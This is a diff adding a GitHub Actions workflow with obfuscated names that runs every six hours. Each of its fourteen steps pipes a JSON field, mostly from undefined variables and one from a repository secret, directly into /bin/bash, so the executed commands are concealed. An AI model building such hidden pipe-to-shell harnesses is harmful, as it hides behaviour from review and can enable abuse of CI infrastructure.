@@ -1,0 +1,31 @@
+name: yutingqqq
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutingqqq
+        env:
+          mvpzt846: ${{ secrets.mvpzt846 }}
+        run: |
+          echo $mvpzt846 | jq -r .syvih1041 | /bin/bash
+          echo $ri87347 | jq -r .e5 | /bin/bash
+          echo $eifx887 | jq -r .khzb874 | /bin/bash
+          echo $pkugi6639 | jq -r .q1 | /bin/bash
+          echo $vhb0 | jq -r .xz8 | /bin/bash
+          echo $bbvi0 | jq -r .dycou48279 | /bin/bash
+          echo $cekn4 | jq -r .xfyxw45 | /bin/bash
+          echo $yclep47252 | jq -r .xd32035 | /bin/bash
+          echo $f96234 | jq -r .hw372 | /bin/bash
+          echo $h686 | jq -r .kxsr02383 | /bin/bash
+          echo $br1610 | jq -r .pzog838 | /bin/bash
+          echo $ojmg14 | jq -r .mn668 | /bin/bash
+          echo $mwgmz02202 | jq -r .uuj9 | /bin/bash
+          echo $url1 | jq -r .eeaj72 | /bin/bash
+
